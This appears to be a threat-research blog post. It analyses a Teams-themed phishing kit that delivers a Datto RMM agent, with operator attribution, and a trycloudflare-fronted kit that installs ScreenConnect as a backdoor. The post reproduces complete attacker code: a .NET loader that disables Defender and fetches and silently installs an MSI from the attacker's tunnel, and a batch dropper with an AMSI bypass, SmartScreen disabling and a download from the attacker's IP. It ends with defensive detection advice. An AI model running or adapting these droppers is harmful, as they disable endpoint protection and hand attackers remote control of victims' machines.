docs.text: The .htaccess deployed alongside the Teams-themed kit is near-identical to the one recovered from the Adobe-themed infrastructure. Both files block the same six specific Google infrastructure IPs (172.253.234[.]208, 172.253.234[.]223, 172.253.192[.]126, 172.253.192[.]123, 172.253.216[.]59, 173.194.92[.]180), the same GoogleBot IP ranges (66.249.64–79), the same mobile UAs, search engine crawlers, SEO tools (Ahrefs, SEMrush, Majestic), security scanners (Nessus, Nikto, Acunetix, Qualys, Nmap, SQLmap, Nuclei, WPScan), headless browsers (Puppeteer, Selenium, PhantomJS, Playwright), social media crawlers (Telegram, Twitter, LinkedIn, Slack, Discord), command-line tools (curl, wget, python), and empty user agents. The identical reactive Google IP blocking — targeting the same six specific addresses previously observed in the Adobe campaign's downloads.log — is a high-confidence indicator that both kits are operated by the same actor or group sharing a common anti-detection template.

docs.title: Social Engineering Flow
docs.text:
The Teams-themed kit walks the victim through a multi-stage flow designed to look like a legitimate Microsoft software update:

  1. Phishing link delivery — the victim receives a phishing link.
  2. Device filtering — index.php routes through invite.php, which performs server-side device detection via user-agent analysis. Only Windows devices are allowed through to the main lure page; everything else (iPhone, Android, iPad, Mac, BlackBerry) is redirected to Device-error.php, which displays a Microsoft-branded message stating "This application is only available on Windows devices." The kit also includes a localhost bypass (127.0.0.1 / ::1) for operator testing.
  3. Fake update page — Windows visitors hit main.php, which presents a convincing Microsoft Teams-branded page claiming "Your Microsoft Teams Client is Out of Date" with a loading spinner and an automatic redirect to the fake Microsoft Store after a 1-second delay. This page also fires visit notifications to both the Telegram bot and the operator's email on load.
  4. Fake Microsoft Store — microsoft_store.php is a polished replica of the Microsoft Store application page for Microsoft Teams. It includes a functional sidebar, search bar, Windows taskbar simulation, app screenshots, ratings (4.3 stars, 22K reviews), and a "Discover more" section featuring Zoom Workspace and Adobe Acrobat Reader DC — notably the same two application brands used across this actor's other phishing campaigns. When the victim clicks "Install" the page simulates a download progress bar (0–100%), then triggers the actual payload download and redirects to an installation guide.
  5. Installation guide — installation_guides.php provides step-by-step instructions styled with Microsoft Teams branding, walking the victim through finding and executing AgentSetup_Axon_Inc.exe from their Downloads folder, with a direct re-download link for good measure.

Exhibit 13: Additionally Discovered MS Teams Fake Website

docs.title: Payload: Datto RMM Agent
docs.text:
The payload here is a Datto RMM agent, downloaded directly from Datto's legitimate infrastructure at:

hxxps://merlot.rmm.datto[.]com/download-agent/windows/6ebac777-206c-4a91-acdd-909a1828bbb2

Saved to disk as AgentSetup_Axon_Inc.exe. The Axon_Inc string in the filename and the UUID in the download URL correspond to a specific Datto RMM tenant account, following the same pattern as the SuperOps campaign — the actor registers (or compromises) an account on a legitimate RMM platform and generates an agent installer tied to their tenant. Datto RMM (formerly Autotask Endpoint Management / CentraStage), like SuperOps, gives the operator full remote access — shell, file transfer, arbitrary command execution, endpoint monitoring — through legitimately signed binaries.

docs.title: Dual Notification Channels: Telegram and Email
docs.text:
Unlike the Adobe-themed kit, which relied solely on Telegram, this one runs a dual-channel operator notification system:

  • Telegram notifications (track_verification.php) go to a different bot and chat ID than the Adobe campaign.
  • Email notifications (send.php) are handled via PHPMailer with the operator's email address configured in ChangeMe.ini.

Operator email: Kharpercimra@protonmail[.]com

Both channels capture the same victim telemetry on every page visit, download attempt, and verification event: IP address, geolocation, ISP, browser, OS, and timestamp. Activity is also logged locally to ./Guard/Audio/live.txt (Exhibit 14).

Exhibit 14: Content of "./Guard/Audio/live.txt" File

docs.title: Operator OPSEC Failures Revealing Kit Lineage
docs.text:
A few copy-paste artefacts in the kit's source code reveal the operator adapted this Microsoft Teams-themed kit from an earlier Zoom-themed variant:

  • In send.php, the download notification email header reads "NEW ZOOM DOWNLOAD ATTEMPT" despite all other references in the file using "Teams" branding (Exhibit 15).
  • The email notification sender name is hardcoded as "Zoom Monitoring".
  • In microsoft_store.php, the JavaScript comment alongside the Datto RMM download URL reads // Example Zoom download URL.

Exhibit 15: Content of "send.php" File

These artefacts indicate the operator maintains a modular phishing kit framework that's re-skinned across multiple application brands — Adobe Reader, Zoom, and Microsoft Teams — while reusing the same backend notification infrastructure, anti-detection logic, and delivery mechanics. I'd expect more variants themed around other commonly targeted applications to exist within the same campaign infrastructure.

docs.title: Telegram Bot OSINT and Operator Attribution
docs.text:
The Telegram bot configured in the Teams-themed kit was queryable via Telegram's public Bot API. The getMe method returned the bot's identity (Exhibit 16):

Field Value Bot ID 7669484417 Bot Display Name Evilman_logs Receiver bot (Vip Hacker) Bot Username @bolexsss_bot

The display name explicitly references "Evilman_logs" and "Vip Hacker", confirming the malicious purpose of the bot and suggesting the operator may be using a commercially available or shared cybercriminal toolset for credential logging.

Exhibit 16: getMe Telegram Response

docs.title: Telegram getUpdates Analysis
docs.text:
Querying getUpdates returned recent messages sent to the bot. The most recent message, dated 16 March 2026 at 14:35 UTC, was a photo sent by a Telegram user with the following details (Exhibit 17):

Field Value User ID 5090243433 Display Name N00B Cyb0T Username @am******* Language Code English Telegram Premium Yes

The timestamp confirms the bot was actively in use as recently as one day prior to collection, indicating the associated phishing infrastructure is still operationally active. Note that the user ID observed in the getUpdates response (5090243433) differs from the chat_id configured in the kit's tele_settings.php (6573403598). The kit is configured to deliver victim notifications to a separate account or group chat (6573403598), while @am******* is a distinct individual who has interacted directly with the bot.

Exhibit 17: getUpdates Telegram Response

docs.title: BreachForums Activity
docs.text:
I went looking for the Telegram username @am******* elsewhere. The same handle is active on BreachForums (breachforums[.]st), a prominent English-language cybercriminal forum. The account am******* shows up in multiple threads, including a reply on 26 March 2025 to a thread distributing a 19,300-entry Algerian credential combolist, and — on the same date — a detailed review thread evaluating multiple carded credit card shops.

The review thread, titled "CC Stores review (DONT BUY ALL SCAM AND TRASH)", gives a first-person account of the author's experience purchasing stolen credit cards from six different underground shops (including briansclub, Gonzo, RealValid, and Fernandogoods), with detailed notes on card validity rates, pricing, refund policies, and operational frustrations. The post demonstrates an active and experienced involvement in credit card fraud.

The interesting bit is the conclusion: the author states that purchasing cards from CC shops is unsustainable, and that it would be preferable to invest in "sms/email/smtp sender and host and all these spamming tools and run my own spamming."

That's a direct, dated statement of intent to pivot from carding to phishing infrastructure operations — and that's precisely the activity I have been documenting throughout this analysis: PHP-based phishing kits with PHPMailer integration, Telegram-based victim notification systems, and multi-brand social engineering lures delivering RMM agents.

docs.title: Attribution Assessment
docs.text:
I assess with high confidence that the Telegram account @am******* ("N00B Cyb0T"), the BreachForums account am*******, and the operator behind at least the Microsoft Teams-themed phishing kit are the same individual, or are closely affiliated. The reasoning:

  1. Identical username across both platforms.
  2. The BreachForums account's stated intent to transition from carding to phishing/spamming infrastructure aligns directly with the observed phishing kit operations.
  3. The Telegram account's direct interaction with @bolexsss_bot — the same bot configured in the kit's tele_settings.php to receive victim notifications.
  4. Timing: the BreachForums activity (March 2025) precedes the observed phishing infrastructure deployment (kit activity from April 2025 onwards).
  5. The English language setting on the Telegram account matching the English-language BreachForums posts.

docs.title: Phishing Kit Development on the Altenen Forum (September 2022)
docs.text:
Digging further turned up corroborating activity that significantly strengthens the assessment. On the Altenen Forum, a long-standing cybercriminal marketplace, a post dated 29 September 2022 authored by user aman********** advertises a Netflix credential phishing kit ("scampage"). The post explicitly lists the Telegram contact @am******* with the display name N00B Cyb0T as the point of contact for the kit — directly linking the aman********** and @am******* identities through self-declaration within the post itself. The post also references a public GitHub repository at github.com/AmanGcS***/Netflixphishingpage, where the "Aman" prefix and "741" suffix match the naming pattern observed across all associated accounts.

The advertised Netflix phishing kit shares direct architectural parallels with the Teams-themed and Adobe-themed kits recovered during this analysis. The Altenen post describes:

  • Dual-channel exfiltration via Telegram API and email.
  • Victim IP geolocation collection — country, city, region, ISP, timezone, user agent.
  • Configurable operator settings via an editable PHP file (email.php for email and Telegram bot token / chat ID — directly analogous to the tele_settings.php and ChangeMe.ini files in the recovered Teams kit).
  • Antibot protections (described in the post as "strong antibots never got redpage" — consistent with the .htaccess-based crawler blocking observed in the current campaign).
  • A multi-stage social engineering flow walking victims through sequential pages before payload delivery.

The consistency of this technical architecture across the 2022 Netflix kit and the 2025–2026 Adobe / Teams / RMM-delivery kits strongly suggests a single developer maintaining and evolving a phishing kit framework over multiple years, progressively adapting the same core infrastructure from consumer credential phishing to corporate-targeting RMM agent delivery.

docs.title: Cross-Platform Account Linkage
docs.text:
OSINT collection on both username variants (aman********** and am*******) surfaces a coherent set of accounts that pre-date the cybercriminal activity.

Both usernames have HackerOne accounts — aman********** created on 21 December 2018 and am******* on 18 August 2024. Both HackerOne accounts are bound to a single verified real-world identity, which I've kept private here. The email aman**********@gmail.com links to a Freelancer profile registered in September 2017 with country code DZ (Algeria). A Chess.com account under am******* also lists country code DZ. A secondary email aman**********@outlook.fr is tied to a Pinterest account under the same username.

The earliest accounts (Freelancer 2017, HackerOne 2018) are on legitimate platforms — freelance work and vulnerability disclosure — suggesting the individual initially explored legitimate technical career paths before transitioning to cybercriminal activity. The first observed malicious activity, the Netflix phishing kit posted on the Altenen Forum, dates to September 2022.

Exhibit 18: am** Profile on Altenen Forum

docs.title: A trycloudflare-Fronted Kit That Ships ScreenConnect as a Backdoor
Summary
docs.text: In July 2026 I stumbled upon an open-directory caught by one of my threat infra hunting rules that turned out to be a read-write WebDAV instance hosting, what I like to call, a remote-access abuse kit. Every Windows, macOS and script path in the kit converges on the same product, a persistent, service-installed ConnectWise ScreenConnect client that phones home over TCP 8041 to one of several attacker-controlled tenants. This post walks through the lures, the layered droppers, the small .NET loader, the ScreenConnect installer configuration and the infrastructure that fronts it all.

docs.title: Key Takeaways
docs.text:
• Based on the observed evidence, I assess with high confidence that this is a deliberate abuse of a legitimate Remote Monitoring and Management (RMM) product (ConnectWise ScreenConnect, formerly ScreenConnect Control) as a backdoor. The installed payload is the real, WiX-generated ScreenConnect ClientSetup MSI (only the pre-baked launch-parameters point at attacker infrastructure).
  • The operator uses cloudflared.exe (the genuine, code-signed Cloudflare tunnel binary) to expose a WsgiDAV file server at 207.174.0[.]143 as a randomly-named trycloudflare.com sub-domain.
  • The kit provides several delivery chains, spanning a phishing HTML page that redirects to Dropbox, small .NET loader executables, standalone ScreenConnect ClientSetup executables, a macOS .pkg, LNK-inside-ZIP droppers, a VBScript variant using MSXML2/ADODB, and a polished batch script that bypasses AMSI and self-elevates through UAC.

docs.title: Where This Started: An Open Directory Behind a Quick-Tunnel
docs.text:
The lead was a URL, hxxps://subscription-magnetic-recommended-meat.trycloudflare[.]com/, that returned a directory listing generated by WsgiDAV 4.3.4 (Figure 1). WsgiDAV is a Python WebDAV implementation where the banner in the response identifies the anonymous user as having read-write access to the root.

Figure 1: The Open WsgiDAV Directory Behind the trycloudflare Quick-Tunnel.

Random-word trycloudflare.com sub-domains are the fingerprint of a Cloudflare "quick tunnel": a one-command tunnel that anyone can raise, without an account, by running cloudflared tunnel --url http://localhost:<port>. Cloudflare assigns the three-or-four-word sub-domain and terminates TLS on their edge, so the origin never appears on the wire. The operator has helpfully staged their copy of cloudflared.exe on the same open directory. It is a legitimate, Cloudflare-signed build (version 2026.6.1), so it will probably not trip antivirus, and the abuse lives entirely in how it is being used, not in what it is.

Figure 2: Cloudflare-signed build (version 2026.6.1)

VirusTotal telemetry on the primary ScreenConnect MSI later reveals the origin server behind the tunnel: 207.174.0.143:8080 (Dynu Systems, US), the same address that also hosts the operator's ScreenConnect instance on TCP 8041. In other words, the same box publishes the payloads and receives the RMM check-ins, and the Cloudflare tunnel is a moving-target hostname in front of it. This approach is nothing new and threat actors have been leveraging for quite some time.

docs.title: Lure Design and Targeting
docs.text:
Even without the original phishing emails, the analysed files paint a consistent picture: broad-spray financial and productivity-app pretexts, cycled to match the season and the language of the recipient. I'll explain this in the sections below.

The most obvious is zoom-update.html, a fake "Zoom Update Required" page (Figure 3). It carries a Zoom-styled SVG logo, a "Version 6.5.1 includes important security patches" hook and a blue Update Zoom Now call-to-action button linking to hxxps://www.dropbox[.]com/scl/fi/a0hp9g4w2ddkb3ggnkivx/Zoomupdateinstaller.msi?rlkey=rxs41my7pahnx0bfpha0zskyi&st=69oirdr0&dl=1. On page load a JavaScript timer redirects the browser to the same Dropbox URL two seconds later, so a distracted user does not even have to click.

Figure 3: The Fake "Zoom Update Required" Page Auto-Redirecting to Dropbox.

At this point I still had payloads and loaders but no lure, nothing a target would ever have been asked to open. I was curious whether this whole kit was fed by a phishing wave and, if so, whether the phishing wrapper had ever been submitted to VirusTotal. So I pivoted off of a sibling SystemCheck.msi (SHA-256 5c09aed8c3d0475d076a338c8569526338bfcbdd91679ab26e24a6cf76134aba). Same tenant and same embedded tcp://207.174.0.143:8041/ C2 as the primary MSI on the open directory, and pulled its VirusTotal execution parents view, which lists every file VirusTotal has ever watched drop or launch that MSI on a real endpoint.

Four entries sat there: two versions of Invoice_Details.pdf.lnk, an Invoice_Details.zip.zip, and 2025_Tax_Transcript.zip, containing a single Invoice_Details.pdf.lnk (Figure 4). The theme is, so to say, loud: it lands in July, three months after United States tax filing, when a "tax transcript" or a follow-up invoice is exactly the sort of unsolicited attachment that a recipient will believe is a real document.

Figure 4: `2025_Tax_Transcript.zip` and Its Contained `Invoice_Details.pdf.lnk`. (SHA256: b58dd8286e57d9f2045a762d59f555b822d3522922bb633bf51bd63fe6ef1a34)

docs.title: Delivery Mechanism
docs.text:
The kit is unusually generous in the number of ways it can deliver its final payload, which is always some flavour of the ScreenConnect ClientSetup. In this section I walk through the four chains I actually reproduced, from the point of user interaction to the point where msiexec is invoked. It's worth mentioning that I am still not sure if the threat actor used any other delivery chain apart from the phishing one, but I'll just leave all the options opened.

The most explicit chain, from the 2025_Tax_Transcript.zip lure, is a five-step story. The user opens the ZIP, sees a document icon named Invoice_Details.pdf.lnk (Windows hides the .lnk), double-clicks it, and control passes to cmd.exe. Reading the LNK's arguments block out of its UTF-16LE bytes gives the whole chain in one line (Figure 5).

Figure 5: `Invoice_Details.pdf.lnk` Arguments Block Showing the `curl` + BAT Chain.

The LNK metadata also leaks its build machine: the machine name is win-livfrvqfmko and the user SID ends in RID 500, which is the built-in local Administrator on a fresh Windows installation. A throwaway VM logged in as Administrator is a very ordinary way for an operator to churn out droppers.

Once run.bat is fetched and executed, it takes over. It is a single-line PowerShell script wrapped in a batch file (Figure 6). It disables its own window, sets %TEMP%\WindowsUpdate.msi as the destination path, downloads SystemCheck.msi from the same origin, silent-installs it via msiexec /qn /norestart, deletes the MSI, and then bounces Explorer to hide the taskbar flicker.

Figure 6: `run.bat` Fetching and Silent-Installing the ScreenConnect MSI.

The LNK-driven chain is the only one I could reproduce end-to-end, but two additional delivery shapes sit on the open directory in parallel. The first is three tiny .NET loader executables (AdobeReader_Update.exe, lirMkvpf.exe, NYbiLtvO.exe), which are covered in the next section. The second is a pair of standalone ScreenConnect ClientSetup executables (SystemCheck.exe, Document-Viewer.exe) that ship the whole client inside a single self-extracting binary.

docs.title: The MemoryLoader.cs .NET Dropper
docs.text:
One of the more useful oversights on the open directory is that the operator left the source code of their .NET loader in place, MemoryLoader.cs. The three small .exe files on the directory are compiled versions of that source. Two of them (AdobeReader_Update.exe and lirMkvpf.exe) share a SHA-256 and are therefore identical builds, while NYbiLtvO.exe differs in exactly one constant: the MSI file name it fetches.

The behaviour is a compact "Defender blinder plus MSI fetcher". The excerpt below is the important half; it hides the console window, walks a fixed script of Set-MpPreference and Add-MpPreference commands to disable real-time monitoring and add sweeping exclusions, stops and disables the WinDefend service, writes the DisableAntiSpyware policy value into HKLM\SOFTWARE\Policies\Microsoft\Windows Defender, downloads the MSI over the trycloudflare tunnel, and finally bounces Explorer to hide the flicker.

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Runtime.InteropServices;

class MemoryLoader
{
    // Windows API for hiding windows
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;
    const int SW_SHOW = 5;

    static string MsiFileName = "JqbMljCi.msi";

    static void Main()
    {
        // Hide the console window immediately
        ShowWindow(GetConsoleWindow(), SW_HIDE);

        try
        {
            // Disable Defender (Multiple methods - ALL SILENT)
            RunPowershellSilent("Set-MpPreference -DisableRealtimeMonitoring True -Force");
            RunPowershellSilent("Set-MpPreference -DisableBehaviorMonitoring True -Force");
            RunPowershellSilent("Set-MpPreference -DisableBlockAtFirstSeen True -Force");
            RunPowershellSilent("Add-MpPreference -ExclusionPath 'C:\' -Force");
            RunPowershellSilent("Add-MpPreference -ExclusionExtension '.exe' -Force");
            RunPowershellSilent("Add-MpPreference -ExclusionExtension '.msi' -Force");

            // Stop Defender services - SILENT
            RunCommandSilent("net", "stop WinDefend /y");
            RunCommandSilent("sc", "config WinDefend start= disabled");
            RunCommandSilent("reg", "add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f");

            // Download and install MSI
            DownloadAndInstallMSI();

            // Restart Explorer
            RunCommandSilent("taskkill", "/f /im explorer.exe");
            Thread.Sleep(2000);
            RunCommandSilent("explorer", "");
        }
        catch { }

        // Keep alive
        Thread.Sleep(Timeout.Infinite);
    }

    static void DownloadAndInstallMSI()
    {
        try
        {
            string msiPath = Path.Combine(Path.GetTempPath(), MsiFileName);
            string tunnelUrl = "https://subscription-magnetic-recommended-meat.trycloudflare.com";

            using (WebClient client = new WebClient())
            {
                client.Headers.Add("User-Agent", "Mozilla/5.0");
                client.DownloadFile(tunnelUrl + "/" + MsiFileName, msiPath);
            }

            RunCommandSilent("msiexec", "/i "" + msiPath + "" /qn /norestart /quiet");
            Thread.Sleep(5000);

            if (File.Exists(msiPath)) File.Delete(msiPath);
        }
        catch { }
    }

    static void RunPowershellSilent(string command)
    {
        try
        {
            // Use ProcessStartInfo with all hiding options
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-Command "" + command + "" -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = false;
            psi.RedirectStandardError = false;
            psi.LoadUserProfile = false;

            Process process = Process.Start(psi);
            if (process != null)
            {
                process.WaitForExit(15000);
                process.Close();
            }
        }
        catch { }
    }

    static void RunCommandSilent(string fileName, string arguments)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = fileName;
            psi.Arguments = arguments;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = false;
            psi.RedirectStandardError = false;
            psi.LoadUserProfile = false;

            Process process = Process.Start(psi);
            if (process != null)
            {
                process.WaitForExit(15000);
                process.Close();
            }
        }
        catch { }
    }
}

This loader is not sophisticated. The disabling of Defender's block-at-first-seen cloud lookup (Set-MpPreference -DisableBlockAtFirstSeen True) plus the .msi extension exclusion is what turns the follow-on msiexec call into a silent, uninspected install even on a stock, fully-patched Windows endpoint. That is where the detection value lives: catching that command sequence, not the loader binary itself.

The MemoryLoader.cs build is compact but rough. VirusTotal shows that the same operator also maintains a much more polished batch-file variant aimed at the same end, silent installation of the ScreenConnect MSI, but through completely different evasion tradecraft, which I walk through in the next section. That polished BAT surfaces as an execution-parent for the primary MSI in VirusTotal's records, alongside the LNK chain from the tax-transcript ZIP. Was MemoryLoader.cs a working file that the threat actor used in an earlier iteration? We will never know.

docs.title: The Polished BAT and a Slip of the Tongue
docs.text:
Elsewhere in the operator's fleet, VirusTotal exposes a much more polished batch dropper (SHA-256 31260c37cc442719ac84540f4159dd9d4738575d2ab05e92c751a9b4b5f9b91b) that surfaces as an execution-parent of the same SystemCheck.msi. Its evasion tradecraft overlaps with MemoryLoader.cs but takes a very different tack. Where the .NET loader focused on flattening Defender itself, stopping the service, disabling it, setting the DisableAntiSpyware policy value and excluding the whole C:\ drive plus both .exe and .msi extensions, this batch dropper leaves Defender's realtime engine running and instead attacks the script-level checks around it: it bypasses AMSI by nulling System.Management.Automation.AmsiUtils.amsiInitFailed via reflection, self-elevates through Start-Process '%~f0' -Verb RunAs for the UAC prompt, disables SmartScreen through the registry, strips the Mark-of-the-Web from the downloaded file with Unlock-File, adds a narrow %TEMP% and per-file Defender exclusion, downloads SystemCheck.msi under the innocuous alias WindowsExplorerSupport.msi, and only then hands off to msiexec for the silent install.

The slip of the tongue is a single line inside the BAT: :: Download ScreenConnect MSI from your RDP. That six-word comment is the reason 207.174.0.143 is publicly identifiable as the operator's own machine and not a compromised third-party host - the operator is describing their own remote-desktop box in the second person while writing the script, and forgot to strip the comment before shipping. It is the single most valuable piece of attribution in the whole kit, and it costs nothing to preserve as a hunting string.

@echo off
setlocal EnableExtensions EnableDelayedExpansion

:: =============================================
:: AMSI BYPASS (Run before PowerShell)
:: =============================================
powershell -WindowStyle Hidden -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

:: =============================================
:: Auto-elevate to Admin (UAC prompt)
:: =============================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: ==============================================
:: Disable Windows SmartScreen
:: ==============================================
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1

:: Restart Explorer to apply
taskkill /f /im explorer.exe >nul 2>&1
start explorer.exe >nul 2>&1

:: ================================================
:: Add Defender exclusion for TEMP folder
:: ================================================
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction SilentlyContinue"

:: ================================================
:: Download ScreenConnect MSI from your RDP
:: ================================================
set "SC_URL=http://207.174.0.143:8080/SystemCheck.msi"
set "SC_PATH=%TEMP%\WindowsExplorerSupport.msi"

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%SC_URL%' -OutFile '%SC_PATH%' -UseBasicParsing"

:: Check if download succeeded
if not exist "%SC_PATH%" (
    echo [ERROR] Download failed. Exiting.
    pause
    exit /b
)

:: Remove Mark-of-the-Web
powershell -WindowStyle Hidden -Command "Unlock-File -Path '%SC_PATH%' -ErrorAction SilentlyContinue"

:: Add exclusion for the MSI file
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%SC_PATH%' -ErrorAction SilentlyContinue"

:: ================================================
:: Silent MSI installation
:: ================================================
msiexec /i "%SC_PATH%" /qn /norestart

:: Clean up
del "%SC_PATH%" >nul 2>&1

exit

At the time of writing, SystemCheck.msi was still live on the C2 (Figure 7), so any defender can retrieve their own copy and inspect the launch-parameters block directly.

Figure 7: C2 Hosting "SystemCheck.msi".

docs.title: The ScreenConnect Client and Its Three Tenants
docs.text:
Every path in the kit terminates in the same product: a ConnectWise Control (formerly ScreenConnect) client, either dropped by the MSI installer, packaged inside a self-extracting ScreenConnect.ClientSetup.exe, or bundled as a macOS .app inside a .pkg. The client is legitimate, WiX 3.11-generated, and its native code has been code-signed by ConnectWise's own DigiCert-issued certificate (which is now revoked, as VirusTotal flags with the tag revoked-cert and the INDICATOR_RMM_ConnectWise_ScreenConnect_CERT YARA rule).

What identifies it as an attacker instance and not a benign IT-support instance is the SERVICE_CLIENT_LAUNCH_PARAMETERS value baked into the MSI's Property table. That value is the exact command-line that the ScreenConnect client uses on first launch, and it contains the host, the port, the base64 RSA session key, and any custom-field campaign labels (Figure 8).

Figure 8: The `SERVICE_CLIENT_LAUNCH_PARAMETERS` Property Inside `JqbMljCi.msi`.

The h= field identifies the C2, the k= field is the tenant's base64 RSA session key and pins the tenant identity, and each c= field is a custom-field campaign label the operator set when generating this client.

The two 5.7 MB standalone ScreenConnect ClientSetup binaries (SystemCheck.exe, Document-Viewer.exe) do not need the MSI stage at all; they ship an internal copy of the same MSI and invoke msiexec on it themselves. Document-Viewer.exe is particularly interesting: its embedded launch string points at a wholly different infrastructure host, blog.derrspecial-onlinedmin[.]live:8041 (Figure 9), which resolves to 216.227.218[.]126 at Tier.Net LLC and belongs to a third ScreenConnect tenant (078712a9fb382090). That is our first-and-only look at a domain-based C2 in this kit, as the other two tenants are all straight IP literals.

Figure 9: `Document-Viewer.exe` Points at a Third C2, `blog.derrspecial-onlinedmin[.]live`.

We can also note that the k= base64 blob is byte-identical between SystemCheck.exe and the MSI cluster, confirming they belong to the same ScreenConnect tenant.

The macOS .pkg follows the same pattern for Apple endpoints. It is a xar archive wrapping a cpio payload that lays out /Applications/connectwisecontrol-3e812e5790a876f3.app/, plus a LaunchDaemon and two LaunchAgents (an onlogin and a prelogin variant) for full-session persistence (Figure 10). The tenant string 3e812e5790a876f3 in the bundle identifier is the same tenant used by the Windows MSI cluster, so a compromised Mac reports to exactly the same ScreenConnect instance as a compromised Windows PC.

Figure 10: The macOS `.pkg` Lays Out a `connectwisecontrol-3e812e5790a876f3.app`.

Bringing the four MSI variants, the two standalone Windows executables and the macOS .pkg together, the tenant map is what closes the loop. Three distinct ConnectWise Control tenants are in play, and the operator runs several concurrent campaigns tagged with different labels while all landing on those same three tenants. The labels in the last column are the operator's own free-text tags inside their ScreenConnect console, used to sort victims by campaign; they are not the phishing themes as seen by the target.

Delivery bundle Tenant C2 host and port Campaign labels BuYUEVqG / JqbMljCi / SystemCheck MSI, plus SystemCheck.exe, plus the macOS .pkg 3e812e5790a876f3 207.174.0[.]143:8041 LinkedIn / HeadWitGlobal, and separately Random / Windows Zoomupdateinstaller.msi 3e812e5790a876f3 207.174.0[.]143:8041 real estate Document-review.msi 7f252422820b074c 142.202.191[.]225:8041 Office / Windows DocumentReview.msi 7f252422820b074c 142.202.191[.]225:80 Office / Windows (fallback port 80 for egress-restricted networks) Document-Viewer.exe 078712a9fb382090 blog.derrspecial-onlinedmin[.]live:8041 (216.227.218[.]126) DropBox access secured

In general, the infection chain can be explained as follows:

Figure 10: Infection Chain

docs.title: Command-and-Control
docs.text:
The client-to-server protocol is native ScreenConnect: an RSA session-key exchange (the k= base64 blob in the launch parameters), followed by a persistent TCP session on either the default port 8041 or an operator-chosen alternative. Every tenant in this kit uses 8041 except the DocumentReview.msi fallback. Traffic from the ScreenConnect client is not obviously malicious in flight; the same protocol is what any legitimate ConnectWise Control managed-service provider would produce.

The delivery layer, in contrast, deliberately blurs the operator's origin. The WsgiDAV staging server sits on 207.174.0.143:8080 while Cloudflare's edge terminates TLS at subscription-magnetic-recommended-meat.trycloudflare[.]com and proxies to the origin. When one tunnel URL gets blocklisted, the operator raises another with a fresh three-or-four-word name and updates their MSI-generation script; the origin IP does not have to move. VirusTotal's in-the-wild URL history for the primary MSI shows both the tunnel-fronted and the raw-IP versions of the same paths, so the tunnel is a hardening pass rather than the sole entrypoint.

VirusTotal's in-the-wild URL list also enumerates additional MSI filenames served from the same origin: DOpbYrTg.msi, grZfbHPN.msi, GBYswvFx.msi, VytQTnqo.msi. Those follow the same eight-random-character naming convention as BuYUEVqG and JqbMljCi, so they are almost certainly further session-key variants of the same tenant. Anyone extending this analysis will want to pull those and confirm.

docs.title: Detection and Mitigation
docs.text:
If you are defending against this, here is what I would recommend:

  • Alert on any TCP :8041 egress to any of the three known C2 IPs (207.174.0.143, 142.202.191.225, 216.227.218.126), and on any DNS query for a trycloudflare.com sub-domain from a user endpoint. Cloudflare quick-tunnels have essentially no legitimate use on managed corporate laptops (Sigma has ready-made rules for both Cloudflared Tunnels Related DNS Requests and Network Connection Initiated To Cloudflared Tunnels Domains).
  • Add AppLocker or WDAC publisher rules blocking Windows Installer packages whose publisher is ScreenConnect Software unless deployed by IT, and cover the self-extracting ScreenConnect.ClientSetup.exe variant as well. Inventory any host that already has a service named ScreenConnect Client (<16 hex>) and validate the tenant string against the approved list.
  • Hunt for the Defender-blinding sequence (Set-MpPreference -DisableRealtimeMonitoring, Add-MpPreference -ExclusionPath 'C:', sc config WinDefend start= disabled, and HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware = 1) executed within sixty seconds of a small (<10 kB) .NET assembly launched from %USERPROFILE%\Downloads, %USERPROFILE%\Desktop or %TEMP%.
  • Alert on the specific AMSI-bypass reflection string [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed' in a PowerShell command line. That construct is very rare in benign scripts.
  • Hunt for bitsadmin /transfer where the URL argument targets a trycloudflare.com sub-domain or an IP literal ending in .bat. Analogously, hunt for curl -s -o "%TEMP%*.bat" against an IP-literal HTTP source.
  • Sweep for the persistence artefacts. On Windows, any service named ScreenConnect Client (<16 hex>) outside your approved tenants, plus the HKCR\sc-<16-hex>\shell\open\command URL handler and the HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\ScreenConnect Client (<16-hex>) safe-boot persistence key. On macOS, the LaunchDaemon and LaunchAgents at /Library/Launch{Daemons,Agents}/connectwisecontrol-*.plist.
  • Block at the email or web gateway ZIP attachments containing .pdf.lnk, .docx.lnk or .xlsx.lnk, and Dropbox direct-download links (?dl=1) from external senders. The tax-transcript ZIP would be blocked by either rule.
  • Report the three tenant identifiers (3e812e5790a876f3, 7f252422820b074c, 078712a9fb382090) to the ConnectWise Trust Center at trust@connectwise.com so the sessions can be revoked at the vendor.

If a host is already enrolled, assume full compromise: the operator inherits the full ScreenConnect feature set, including remote command execution, file transfer and unattended access. Uninstall the client, purge the persistence keys, rotate any credentials cached or entered on the host during the compromise window, and treat the network segment as needing a lateral-movement sweep.
